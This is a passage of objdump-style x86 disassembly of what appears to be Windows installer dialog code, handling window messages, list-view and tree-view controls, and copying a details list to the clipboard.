  404823:	6a 20                	push   $0x20
  404825:	5f                   	pop    %edi
  404826:	57                   	push   %edi
  404827:	e8 7a ca ff ff       	call   0x4012a6
  40482c:	57                   	push   %edi
  40482d:	53                   	push   %ebx
  40482e:	68 20 04 00 00       	push   $0x420
  404833:	ff 75 08             	push   0x8(%ebp)
  404836:	ff d6                	call   *%esi
  404838:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  40483f:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404842:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404849:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404850:	75 0c                	jne    0x40485e
  404852:	53                   	push   %ebx
  404853:	53                   	push   %ebx
  404854:	68 00 02 00 00       	push   $0x200
  404859:	ff 75 fc             	push   -0x4(%ebp)
  40485c:	ff d6                	call   *%esi
  40485e:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404865:	75 32                	jne    0x404899
  404867:	a1 f8 a1 43 00       	mov    0x43a1f8,%eax
  40486c:	3b c3                	cmp    %ebx,%eax
  40486e:	74 07                	je     0x404877
  404870:	50                   	push   %eax
  404871:	ff 15 2c 80 40 00    	call   *0x40802c
  404877:	a1 fc a1 43 00       	mov    0x43a1fc,%eax
  40487c:	3b c3                	cmp    %ebx,%eax
  40487e:	74 07                	je     0x404887
  404880:	50                   	push   %eax
  404881:	ff 15 2c 81 40 00    	call   *0x40812c
  404887:	89 1d f8 a1 43 00    	mov    %ebx,0x43a1f8
  40488d:	89 1d fc a1 43 00    	mov    %ebx,0x43a1fc
  404893:	89 1d f0 05 47 00    	mov    %ebx,0x4705f0
  404899:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4048a0:	0f 85 4b 01 00 00    	jne    0x4049f1
  4048a6:	53                   	push   %ebx
  4048a7:	53                   	push   %ebx
  4048a8:	e8 4b c9 ff ff       	call   0x4011f8
  4048ad:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4048b0:	74 07                	je     0x4048b9
  4048b2:	6a 08                	push   $0x8
  4048b4:	e8 64 cb ff ff       	call   0x40141d
  4048b9:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4048bc:	74 3f                	je     0x4048fd
  4048be:	ff 35 fc a1 43 00    	push   0x43a1fc
  4048c4:	e8 28 ca ff ff       	call   0x4012f1
  4048c9:	8b f8                	mov    %eax,%edi
  4048cb:	57                   	push   %edi
  4048cc:	e8 d5 c9 ff ff       	call   0x4012a6
  4048d1:	33 c0                	xor    %eax,%eax
  4048d3:	33 c9                	xor    %ecx,%ecx
  4048d5:	3b fb                	cmp    %ebx,%edi
  4048d7:	7e 0e                	jle    0x4048e7
  4048d9:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4048dc:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  4048df:	74 01                	je     0x4048e2
  4048e1:	41                   	inc    %ecx
  4048e2:	40                   	inc    %eax
  4048e3:	3b c7                	cmp    %edi,%eax
  4048e5:	7c f2                	jl     0x4048d9
  4048e7:	53                   	push   %ebx
  4048e8:	51                   	push   %ecx
  4048e9:	68 4e 01 00 00       	push   $0x14e
  4048ee:	ff 75 f8             	push   -0x8(%ebp)
  4048f1:	ff d6                	call   *%esi
  4048f3:	89 7d 14             	mov    %edi,0x14(%ebp)
  4048f6:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  4048fd:	53                   	push   %ebx
  4048fe:	53                   	push   %ebx
  4048ff:	e8 f4 c8 ff ff       	call   0x4011f8
  404904:	39 1d ac 05 47 00    	cmp    %ebx,0x4705ac
  40490a:	a1 fc a1 43 00       	mov    0x43a1fc,%eax
  40490f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404912:	a1 a8 05 47 00       	mov    0x4705a8,%eax
  404917:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  40491e:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404921:	0f 8e a1 00 00 00    	jle    0x4049c8
  404927:	8d 78 08             	lea    0x8(%eax),%edi
  40492a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40492d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404930:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404933:	3b c3                	cmp    %ebx,%eax
  404935:	74 79                	je     0x4049b0
  404937:	8b 0f                	mov    (%edi),%ecx
  404939:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40493c:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  404943:	f7 c1 00 01 00 00    	test   $0x100,%ecx
  404949:	74 13                	je     0x40495e
  40494b:	8d 47 10             	lea    0x10(%edi),%eax
  40494e:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  404955:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404958:	81 27 ff fe ff ff    	andl   $0xfffffeff,(%edi)
  40495e:	f6 c1 40             	test   $0x40,%cl
  404961:	74 05                	je     0x404968
  404963:	6a 03                	push   $0x3
  404965:	58                   	pop    %eax
  404966:	eb 0e                	jmp    0x404976
  404968:	8b c1                	mov    %ecx,%eax
  40496a:	83 e0 01             	and    $0x1,%eax
  40496d:	40                   	inc    %eax
  40496e:	f6 c1 10             	test   $0x10,%cl
  404971:	74 03                	je     0x404976
  404973:	83 c0 03             	add    $0x3,%eax
  404976:	ff 75 bc             	push   -0x44(%ebp)
  404979:	8b d1                	mov    %ecx,%edx
  40497b:	c1 e0 0b             	shl    $0xb,%eax
  40497e:	83 e2 08             	and    $0x8,%edx
  404981:	0b c2                	or     %edx,%eax
  404983:	8b d1                	mov    %ecx,%edx
  404985:	c1 f9 05             	sar    $0x5,%ecx
  404988:	03 c0                	add    %eax,%eax
  40498a:	83 e2 20             	and    $0x20,%edx
  40498d:	0b c2                	or     %edx,%eax
  40498f:	83 e1 01             	and    $0x1,%ecx
  404992:	41                   	inc    %ecx
  404993:	51                   	push   %ecx
  404994:	68 02 11 00 00       	push   $0x1102
  404999:	ff 75 fc             	push   -0x4(%ebp)
  40499c:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40499f:	ff d6                	call   *%esi
  4049a1:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4049a4:	50                   	push   %eax
  4049a5:	53                   	push   %ebx
  4049a6:	68 3f 11 00 00       	push   $0x113f
  4049ab:	ff 75 fc             	push   -0x4(%ebp)
  4049ae:	ff d6                	call   *%esi
  4049b0:	ff 45 e8             	incl   -0x18(%ebp)
  4049b3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4049b6:	81 c7 20 40 00 00    	add    $0x4020,%edi
  4049bc:	3b 05 ac 05 47 00    	cmp    0x4705ac,%eax
  4049c2:	0f 8c 62 ff ff ff    	jl     0x40492a
  4049c8:	6a 01                	push   $0x1
  4049ca:	53                   	push   %ebx
  4049cb:	ff 75 fc             	push   -0x4(%ebp)
  4049ce:	ff 15 74 82 40 00    	call   *0x408274
  4049d4:	a1 68 85 46 00       	mov    0x468568,%eax
  4049d9:	39 58 10             	cmp    %ebx,0x10(%eax)
  4049dc:	74 13                	je     0x4049f1
  4049de:	6a 05                	push   $0x5
  4049e0:	e8 cb f5 ff ff       	call   0x403fb0
  4049e5:	6a fb                	push   $0xfffffffb
  4049e7:	68 ff 03 00 00       	push   $0x3ff
  4049ec:	e8 f6 f4 ff ff       	call   0x403ee7
  4049f1:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  4049f8:	75 38                	jne    0x404a32
  4049fa:	f7 05 e8 05 47 00 00 	testl  $0x100,0x4705e8
  404a01:	01 00 00 
  404a04:	74 2c                	je     0x404a32
  404a06:	8b 35 34 82 40 00    	mov    0x408234,%esi
  404a0c:	33 c0                	xor    %eax,%eax
  404a0e:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404a12:	0f 94 c0             	sete   %al
  404a15:	c1 e0 03             	shl    $0x3,%eax
  404a18:	8b f8                	mov    %eax,%edi
  404a1a:	57                   	push   %edi
  404a1b:	ff 75 fc             	push   -0x4(%ebp)
  404a1e:	ff d6                	call   *%esi
  404a20:	57                   	push   %edi
  404a21:	68 fe 03 00 00       	push   $0x3fe
  404a26:	ff 75 08             	push   0x8(%ebp)
  404a29:	ff 15 60 82 40 00    	call   *0x408260
  404a2f:	50                   	push   %eax
  404a30:	ff d6                	call   *%esi
  404a32:	ff 75 14             	push   0x14(%ebp)
  404a35:	8b 45 0c             	mov    0xc(%ebp),%eax
  404a38:	ff 75 10             	push   0x10(%ebp)
  404a3b:	e8 e6 ee ff ff       	call   0x403926
  404a40:	5f                   	pop    %edi
  404a41:	5e                   	pop    %esi
  404a42:	5b                   	pop    %ebx
  404a43:	c9                   	leave
  404a44:	c2 10 00             	ret    $0x10
  404a47:	55                   	push   %ebp
  404a48:	8b ec                	mov    %esp,%ebp
  404a4a:	83 ec 44             	sub    $0x44,%esp
  404a4d:	a1 4c 85 46 00       	mov    0x46854c,%eax
  404a52:	57                   	push   %edi
  404a53:	33 ff                	xor    %edi,%edi
  404a55:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404a58:	3b c7                	cmp    %edi,%eax
  404a5a:	0f 84 b7 00 00 00    	je     0x404b17
  404a60:	53                   	push   %ebx
  404a61:	8b 1d 74 06 47 00    	mov    0x470674,%ebx
  404a67:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  404a6a:	83 e3 01             	and    $0x1,%ebx
  404a6d:	56                   	push   %esi
  404a6e:	be 10 e2 43 00       	mov    $0x43e210,%esi
  404a73:	75 09                	jne    0x404a7e
  404a75:	ff 75 08             	push   0x8(%ebp)
  404a78:	56                   	push   %esi
  404a79:	e8 20 16 00 00       	call   0x40609e
  404a7e:	56                   	push   %esi
  404a7f:	e8 1e 10 00 00       	call   0x405aa2
  404a84:	89 45 08             	mov    %eax,0x8(%ebp)
  404a87:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  404a8a:	74 1b                	je     0x404aa7
  404a8c:	ff 75 0c             	push   0xc(%ebp)
  404a8f:	e8 0e 10 00 00       	call   0x405aa2
  404a94:	03 45 08             	add    0x8(%ebp),%eax
  404a97:	3d 10 80 00 00       	cmp    $0x8010,%eax
  404a9c:	73 77                	jae    0x404b15
  404a9e:	ff 75 0c             	push   0xc(%ebp)
  404aa1:	56                   	push   %esi
  404aa2:	e8 01 10 00 00       	call   0x405aa8
  404aa7:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  404aab:	75 0d                	jne    0x404aba
  404aad:	56                   	push   %esi
  404aae:	ff 35 58 85 46 00    	push   0x468558
  404ab4:	ff 15 28 82 40 00    	call   *0x408228
  404aba:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  404abe:	75 44                	jne    0x404b04
  404ac0:	57                   	push   %edi
  404ac1:	57                   	push   %edi
  404ac2:	68 04 10 00 00       	push   $0x1004
  404ac7:	ff 75 fc             	push   -0x4(%ebp)
  404aca:	89 75 d0             	mov    %esi,-0x30(%ebp)
  404acd:	8b 35 78 82 40 00    	mov    0x408278,%esi
  404ad3:	c7 45 bc 01 00 00 00 	movl   $0x1,-0x44(%ebp)
  404ada:	ff d6                	call   *%esi
  404adc:	2b c3                	sub    %ebx,%eax
  404ade:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404ae1:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404ae4:	50                   	push   %eax
  404ae5:	57                   	push   %edi
  404ae6:	b8 4d 10 00 00       	mov    $0x104d,%eax
  404aeb:	2b c3                	sub    %ebx,%eax
  404aed:	50                   	push   %eax
  404aee:	ff 75 fc             	push   -0x4(%ebp)
  404af1:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  404af4:	ff d6                	call   *%esi
  404af6:	57                   	push   %edi
  404af7:	ff 75 c0             	push   -0x40(%ebp)
  404afa:	68 13 10 00 00       	push   $0x1013
  404aff:	ff 75 fc             	push   -0x4(%ebp)
  404b02:	ff d6                	call   *%esi
  404b04:	3b df                	cmp    %edi,%ebx
  404b06:	74 0d                	je     0x404b15
  404b08:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b0b:	33 c0                	xor    %eax,%eax
  404b0d:	66 89 04 4d 10 e2 43 	mov    %ax,0x43e210(,%ecx,2)
  404b14:	00 
  404b15:	5e                   	pop    %esi
  404b16:	5b                   	pop    %ebx
  404b17:	5f                   	pop    %edi
  404b18:	c9                   	leave
  404b19:	c2 08 00             	ret    $0x8
  404b1c:	56                   	push   %esi
  404b1d:	8b 35 a8 05 47 00    	mov    0x4705a8,%esi
  404b23:	57                   	push   %edi
  404b24:	8b 3d ac 05 47 00    	mov    0x4705ac,%edi
  404b2a:	6a 00                	push   $0x0
  404b2c:	ff 15 b0 82 40 00    	call   *0x4082b0
  404b32:	09 05 78 06 47 00    	or     %eax,0x470678
  404b38:	6a 00                	push   $0x0
  404b3a:	e8 cc ed ff ff       	call   0x40390b
  404b3f:	85 ff                	test   %edi,%edi
  404b41:	74 2b                	je     0x404b6e
  404b43:	83 c6 0c             	add    $0xc,%esi
  404b46:	4f                   	dec    %edi
  404b47:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  404b4b:	74 0f                	je     0x404b5c
  404b4d:	ff 74 24 0c          	push   0xc(%esp)
  404b51:	ff 36                	push   (%esi)
  404b53:	e8 43 c8 ff ff       	call   0x40139b
  404b58:	85 c0                	test   %eax,%eax
  404b5a:	75 0c                	jne    0x404b68
  404b5c:	81 c6 20 40 00 00    	add    $0x4020,%esi
  404b62:	85 ff                	test   %edi,%edi
  404b64:	75 e0                	jne    0x404b46
  404b66:	eb 06                	jmp    0x404b6e
  404b68:	ff 05 4c 06 47 00    	incl   0x47064c
  404b6e:	68 04 04 00 00       	push   $0x404
  404b73:	e8 93 ed ff ff       	call   0x40390b
  404b78:	ff 15 b4 82 40 00    	call   *0x4082b4
  404b7e:	a1 4c 06 47 00       	mov    0x47064c,%eax
  404b83:	5f                   	pop    %edi
  404b84:	5e                   	pop    %esi
  404b85:	c2 04 00             	ret    $0x4
  404b88:	55                   	push   %ebp
  404b89:	8b ec                	mov    %esp,%ebp
  404b8b:	83 ec 54             	sub    $0x54,%esp
  404b8e:	53                   	push   %ebx
  404b8f:	56                   	push   %esi
  404b90:	8b 35 4c 85 46 00    	mov    0x46854c,%esi
  404b96:	33 db                	xor    %ebx,%ebx
  404b98:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404b9f:	57                   	push   %edi
  404ba0:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404ba3:	0f 85 8c 01 00 00    	jne    0x404d35
  404ba9:	83 4d c4 ff          	orl    $0xffffffff,-0x3c(%ebp)
  404bad:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  404bb1:	c7 45 bc 02 00 00 00 	movl   $0x2,-0x44(%ebp)
  404bb8:	89 5d c0             	mov    %ebx,-0x40(%ebp)
  404bbb:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  404bbe:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404bc1:	33 c0                	xor    %eax,%eax
  404bc3:	8d 7d d4             	lea    -0x2c(%ebp),%edi
  404bc6:	ab                   	stos   %eax,%es:(%edi)
  404bc7:	ab                   	stos   %eax,%es:(%edi)
  404bc8:	ab                   	stos   %eax,%es:(%edi)
  404bc9:	ab                   	stos   %eax,%es:(%edi)
  404bca:	ab                   	stos   %eax,%es:(%edi)
  404bcb:	a1 9c 05 47 00       	mov    0x47059c,%eax
  404bd0:	8b 48 5c             	mov    0x5c(%eax),%ecx
  404bd3:	8b 40 60             	mov    0x60(%eax),%eax
  404bd6:	8b 3d 60 82 40 00    	mov    0x408260,%edi
  404bdc:	68 03 04 00 00       	push   $0x403
  404be1:	ff 75 08             	push   0x8(%ebp)
  404be4:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404be7:	89 45 10             	mov    %eax,0x10(%ebp)
  404bea:	ff d7                	call   *%edi
  404bec:	68 ee 03 00 00       	push   $0x3ee
  404bf1:	ff 75 08             	push   0x8(%ebp)
  404bf4:	a3 60 85 46 00       	mov    %eax,0x468560
  404bf9:	ff d7                	call   *%edi
  404bfb:	68 f8 03 00 00       	push   $0x3f8
  404c00:	ff 75 08             	push   0x8(%ebp)
  404c03:	a3 58 85 46 00       	mov    %eax,0x468558
  404c08:	ff d7                	call   *%edi
  404c0a:	ff 35 60 85 46 00    	push   0x468560
  404c10:	a3 4c 85 46 00       	mov    %eax,0x46854c
  404c15:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404c18:	e8 d7 ec ff ff       	call   0x4038f4
  404c1d:	6a 04                	push   $0x4
  404c1f:	e8 8c f3 ff ff       	call   0x403fb0
  404c24:	a3 64 85 46 00       	mov    %eax,0x468564
  404c29:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404c2c:	50                   	push   %eax
  404c2d:	ff 75 fc             	push   -0x4(%ebp)
  404c30:	89 1d 6c 85 46 00    	mov    %ebx,0x46856c
  404c36:	ff 15 84 82 40 00    	call   *0x408284
  404c3c:	6a 15                	push   $0x15
  404c3e:	ff 15 c8 81 40 00    	call   *0x4081c8
  404c44:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c47:	8b 35 78 82 40 00    	mov    0x408278,%esi
  404c4d:	2b c8                	sub    %eax,%ecx
  404c4f:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404c52:	50                   	push   %eax
  404c53:	53                   	push   %ebx
  404c54:	68 61 10 00 00       	push   $0x1061
  404c59:	ff 75 fc             	push   -0x4(%ebp)
  404c5c:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404c5f:	ff d6                	call   *%esi
  404c61:	b8 00 40 00 00       	mov    $0x4000,%eax
  404c66:	50                   	push   %eax
  404c67:	50                   	push   %eax
  404c68:	68 36 10 00 00       	push   $0x1036
  404c6d:	ff 75 fc             	push   -0x4(%ebp)
  404c70:	ff d6                	call   *%esi
  404c72:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404c75:	7c 1c                	jl     0x404c93
  404c77:	ff 75 0c             	push   0xc(%ebp)
  404c7a:	53                   	push   %ebx
  404c7b:	68 01 10 00 00       	push   $0x1001
  404c80:	ff 75 fc             	push   -0x4(%ebp)
  404c83:	ff d6                	call   *%esi
  404c85:	ff 75 0c             	push   0xc(%ebp)
  404c88:	53                   	push   %ebx
  404c89:	68 26 10 00 00       	push   $0x1026
  404c8e:	ff 75 fc             	push   -0x4(%ebp)
  404c91:	ff d6                	call   *%esi
  404c93:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  404c96:	7c 0e                	jl     0x404ca6
  404c98:	ff 75 10             	push   0x10(%ebp)
  404c9b:	53                   	push   %ebx
  404c9c:	68 24 10 00 00       	push   $0x1024
  404ca1:	ff 75 fc             	push   -0x4(%ebp)
  404ca4:	ff d6                	call   *%esi
  404ca6:	8b 45 14             	mov    0x14(%ebp),%eax
  404ca9:	ff 70 30             	push   0x30(%eax)
  404cac:	6a 1b                	push   $0x1b
  404cae:	ff 75 08             	push   0x8(%ebp)
  404cb1:	e8 e5 eb ff ff       	call   0x40389b
  404cb6:	f6 05 e8 05 47 00 03 	testb  $0x3,0x4705e8
  404cbd:	74 34                	je     0x404cf3
  404cbf:	53                   	push   %ebx
  404cc0:	ff 35 60 85 46 00    	push   0x468560
  404cc6:	ff 15 34 82 40 00    	call   *0x408234
  404ccc:	f6 05 e8 05 47 00 02 	testb  $0x2,0x4705e8
  404cd3:	75 0d                	jne    0x404ce2
  404cd5:	6a 08                	push   $0x8
  404cd7:	ff 75 fc             	push   -0x4(%ebp)
  404cda:	ff 15 34 82 40 00    	call   *0x408234
  404ce0:	eb 06                	jmp    0x404ce8
  404ce2:	89 1d 60 85 46 00    	mov    %ebx,0x468560
  404ce8:	ff 35 58 85 46 00    	push   0x468558
  404cee:	e8 01 ec ff ff       	call   0x4038f4
  404cf3:	68 ec 03 00 00       	push   $0x3ec
  404cf8:	ff 75 08             	push   0x8(%ebp)
  404cfb:	ff d7                	call   *%edi
  404cfd:	68 00 00 30 75       	push   $0x75300000
  404d02:	53                   	push   %ebx
  404d03:	8b f8                	mov    %eax,%edi
  404d05:	68 01 04 00 00       	push   $0x401
  404d0a:	57                   	push   %edi
  404d0b:	ff d6                	call   *%esi
  404d0d:	f6 05 e8 05 47 00 04 	testb  $0x4,0x4705e8
  404d14:	74 18                	je     0x404d2e
  404d16:	ff 75 10             	push   0x10(%ebp)
  404d19:	53                   	push   %ebx
  404d1a:	68 09 04 00 00       	push   $0x409
  404d1f:	57                   	push   %edi
  404d20:	ff d6                	call   *%esi
  404d22:	ff 75 0c             	push   0xc(%ebp)
  404d25:	53                   	push   %ebx
  404d26:	68 01 20 00 00       	push   $0x2001
  404d2b:	57                   	push   %edi
  404d2c:	ff d6                	call   *%esi
  404d2e:	33 c0                	xor    %eax,%eax
  404d30:	e9 8f 00 00 00       	jmp    0x404dc4
  404d35:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404d3c:	75 28                	jne    0x404d66
  404d3e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404d41:	50                   	push   %eax
  404d42:	53                   	push   %ebx
  404d43:	68 ec 03 00 00       	push   $0x3ec
  404d48:	ff 75 08             	push   0x8(%ebp)
  404d4b:	ff 15 60 82 40 00    	call   *0x408260
  404d51:	50                   	push   %eax
  404d52:	68 1c 4b 40 00       	push   $0x404b1c
  404d57:	53                   	push   %ebx
  404d58:	53                   	push   %ebx
  404d59:	ff 15 d0 80 40 00    	call   *0x4080d0
  404d5f:	50                   	push   %eax
  404d60:	ff 15 bc 80 40 00    	call   *0x4080bc
  404d66:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404d6d:	8b 3d 34 82 40 00    	mov    0x408234,%edi
  404d73:	75 1f                	jne    0x404d94
  404d75:	b8 03 04 00 00       	mov    $0x403,%eax
  404d7a:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  404d7e:	75 36                	jne    0x404db6
  404d80:	53                   	push   %ebx
  404d81:	ff 35 60 85 46 00    	push   0x468560
  404d87:	ff d7                	call   *%edi
  404d89:	6a 08                	push   $0x8
  404d8b:	56                   	push   %esi
  404d8c:	ff d7                	call   *%edi
  404d8e:	56                   	push   %esi
  404d8f:	e8 60 eb ff ff       	call   0x4038f4
  404d94:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  404d9b:	75 55                	jne    0x404df2
  404d9d:	39 1d 54 85 46 00    	cmp    %ebx,0x468554
  404da3:	74 26                	je     0x404dcb
  404da5:	6a 78                	push   $0x78
  404da7:	c7 05 48 62 45 00 02 	movl   $0x2,0x456248
  404dae:	00 00 00 
  404db1:	e8 be ea ff ff       	call   0x403874
  404db6:	ff 75 14             	push   0x14(%ebp)
  404db9:	8b 45 0c             	mov    0xc(%ebp),%eax
  404dbc:	ff 75 10             	push   0x10(%ebp)
  404dbf:	e8 62 eb ff ff       	call   0x403926
  404dc4:	5f                   	pop    %edi
  404dc5:	5e                   	pop    %esi
  404dc6:	5b                   	pop    %ebx
  404dc7:	c9                   	leave
  404dc8:	c2 10 00             	ret    $0x10
  404dcb:	6a 08                	push   $0x8
  404dcd:	ff 35 94 05 47 00    	push   0x470594
  404dd3:	ff d7                	call   *%edi
  404dd5:	39 1d 4c 06 47 00    	cmp    %ebx,0x47064c
  404ddb:	75 0e                	jne    0x404deb
  404ddd:	a1 40 62 45 00       	mov    0x456240,%eax
  404de2:	53                   	push   %ebx
  404de3:	ff 70 34             	push   0x34(%eax)
  404de6:	e8 5c fc ff ff       	call   0x404a47
  404deb:	6a 01                	push   $0x1
  404ded:	e8 82 ea ff ff       	call   0x403874
  404df2:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  404df6:	75 be                	jne    0x404db6
  404df8:	39 75 10             	cmp    %esi,0x10(%ebp)
  404dfb:	75 b9                	jne    0x404db6
  404dfd:	53                   	push   %ebx
  404dfe:	53                   	push   %ebx
  404dff:	68 04 10 00 00       	push   $0x1004
  404e04:	56                   	push   %esi
  404e05:	ff 15 78 82 40 00    	call   *0x408278
  404e0b:	3b c3                	cmp    %ebx,%eax
  404e0d:	89 45 0c             	mov    %eax,0xc(%ebp)
  404e10:	0f 8e 18 ff ff ff    	jle    0x404d2e
  404e16:	ff 15 c4 81 40 00    	call   *0x4081c4
  404e1c:	6a e1                	push   $0xffffffe1
  404e1e:	53                   	push   %ebx
  404e1f:	8b f8                	mov    %eax,%edi
  404e21:	e8 78 12 00 00       	call   0x40609e
  404e26:	50                   	push   %eax
  404e27:	6a 01                	push   $0x1
  404e29:	53                   	push   %ebx
  404e2a:	57                   	push   %edi
  404e2b:	ff 15 c0 81 40 00    	call   *0x4081c0
  404e31:	8b 45 14             	mov    0x14(%ebp),%eax
  404e34:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e37:	75 13                	jne    0x404e4c
  404e39:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404e3c:	50                   	push   %eax
  404e3d:	56                   	push   %esi
  404e3e:	ff 15 bc 81 40 00    	call   *0x4081bc
  404e44:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404e47:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404e4a:	eb 07                	jmp    0x404e53
  404e4c:	0f bf c8             	movswl %ax,%ecx
  404e4f:	c1 e8 10             	shr    $0x10,%eax
  404e52:	98                   	cwtl
  404e53:	53                   	push   %ebx
  404e54:	ff 75 08             	push   0x8(%ebp)
  404e57:	53                   	push   %ebx
  404e58:	50                   	push   %eax
  404e59:	51                   	push   %ecx
  404e5a:	68 80 01 00 00       	push   $0x180
  404e5f:	57                   	push   %edi
  404e60:	ff 15 b8 81 40 00    	call   *0x4081b8
  404e66:	33 f6                	xor    %esi,%esi
  404e68:	46                   	inc    %esi
  404e69:	3b c6                	cmp    %esi,%eax
  404e6b:	0f 85 bd fe ff ff    	jne    0x404d2e
  404e71:	8b 45 0c             	mov    0xc(%ebp),%eax
  404e74:	89 5d b4             	mov    %ebx,-0x4c(%ebp)
  404e77:	c7 45 c0 20 62 44 00 	movl   $0x446220,-0x40(%ebp)
  404e7e:	c7 45 c4 1f 00 01 00 	movl   $0x1001f,-0x3c(%ebp)
  404e85:	89 45 08             	mov    %eax,0x8(%ebp)
  404e88:	bf 73 10 00 00       	mov    $0x1073,%edi
  404e8d:	ff 4d 08             	decl   0x8(%ebp)
  404e90:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404e93:	50                   	push   %eax
  404e94:	ff 75 08             	push   0x8(%ebp)
  404e97:	57                   	push   %edi
  404e98:	ff 75 fc             	push   -0x4(%ebp)
  404e9b:	ff 15 78 82 40 00    	call   *0x408278
  404ea1:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  404ea5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  404ea8:	75 e3                	jne    0x404e8d
  404eaa:	53                   	push   %ebx
  404eab:	ff 15 b4 81 40 00    	call   *0x4081b4
  404eb1:	ff 15 b0 81 40 00    	call   *0x4081b0
  404eb7:	8d 04 36             	lea    (%esi,%esi,1),%eax
  404eba:	50                   	push   %eax
  404ebb:	6a 42                	push   $0x42
  404ebd:	ff 15 20 81 40 00    	call   *0x408120
  404ec3:	50                   	push   %eax
  404ec4:	89 45 08             	mov    %eax,0x8(%ebp)
  404ec7:	ff 15 cc 80 40 00    	call   *0x4080cc
  404ecd:	8b f0                	mov    %eax,%esi
  404ecf:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404ed2:	50                   	push   %eax
  404ed3:	53                   	push   %ebx
  404ed4:	57                   	push   %edi
  404ed5:	ff 75 fc             	push   -0x4(%ebp)
  404ed8:	89 75 c0             	mov    %esi,-0x40(%ebp)
  404edb:	ff 15 78 82 40 00    	call   *0x408278
  404ee1:	8d 34 46             	lea    (%esi,%eax,2),%esi
  404ee4:	6a 0d                	push   $0xd
  404ee6:	58                   	pop    %eax
  404ee7:	66 89 06             	mov    %ax,(%esi)
  404eea:	46                   	inc    %esi
  404eeb:	46                   	inc    %esi
  404eec:	6a 0a                	push   $0xa
  404eee:	58                   	pop    %eax
  404eef:	66 89 06             	mov    %ax,(%esi)
  404ef2:	46                   	inc    %esi
  404ef3:	46                   	inc    %esi
  404ef4:	43                   	inc    %ebx
  404ef5:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  404ef8:	7c d5                	jl     0x404ecf
  404efa:	ff 75 08             	push   0x8(%ebp)
  404efd:	ff 15 c8 80 40 00    	call   *0x4080c8
  404f03:	ff 75 08             	push   0x8(%ebp)
  404f06:	6a 0d                	push   $0xd
  404f08:	ff 15 ac 81 40 00    	call   *0x4081ac
  404f0e:	ff 15 a8 81 40 00    	call   *0x4081a8
  404f14:	e9 15 fe ff ff       	jmp    0x404d2e
  404f19:	83 ec 10             	sub    $0x10,%esp
  404f1c:	53                   	push   %ebx
  404f1d:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404f21:	55                   	push   %ebp
  404f22:	b9 10 01 00 00       	mov    $0x110,%ecx
  404f27:	56                   	push   %esi
  404f28:	57                   	push   %edi
  404f29:	3b d9                	cmp    %ecx,%ebx
  404f2b:	0f 84 3c 01 00 00    	je     0x40506d
  404f31:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  404f37:	0f 84 30 01 00 00    	je     0x40506d
  404f3d:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404f41:	33 ed                	xor    %ebp,%ebp
  404f43:	83 fb 47             	cmp    $0x47,%ebx
  404f46:	75 13                	jne    0x404f5b
